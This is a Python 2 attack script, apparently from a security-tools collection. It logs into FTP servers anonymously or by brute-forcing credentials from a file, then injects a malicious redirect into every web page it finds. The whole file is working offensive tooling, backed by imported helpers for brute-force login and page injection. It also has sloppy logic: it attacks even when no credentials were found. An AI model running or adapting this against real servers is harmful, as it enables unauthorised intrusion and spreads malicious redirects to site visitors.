import sys
import os
import ftplib
sys.path.append(os.path.realpath('../scripts'))
from Args import *
from anonFtpScanner import anonLogin
from bruteForceLogin import bruteLogin
from getPages import getFtpPages
from injectMaliciousPage import injectPage

def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    pagesToInject = getFtpPages(ftp)
    for page in pagesToInject:
        injectPage(ftp, page, redirect)

def main():
    args = Args({'-H': 'tgtHosts', '-r': 'redirectPage', '-f': 'userPassFile' })
    options = args.getArgs()
    tgtHosts = str(options.tgtHosts).split(', ')
    passwordFile = options.userPassFile
    redirect = options.redirectPage
    for tgtHost in tgtHosts:
        username = None
        password = None
        if anonLogin(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print '[+] Using Anonymous Creds to Attack'
            attack(username, password, tgtHost, redirect)
        elif passwordFile != None:
            (username, password) = bruteLogin(tgtHost, passwordFile)
        if password != None:
            print '[+] Using Creds: ' + username + '/' + 'password to attack'
        attack(username, password, tgtHost, redirect)
if __name__ == '__main__':
    main()
        
            
                     
                     
    

    
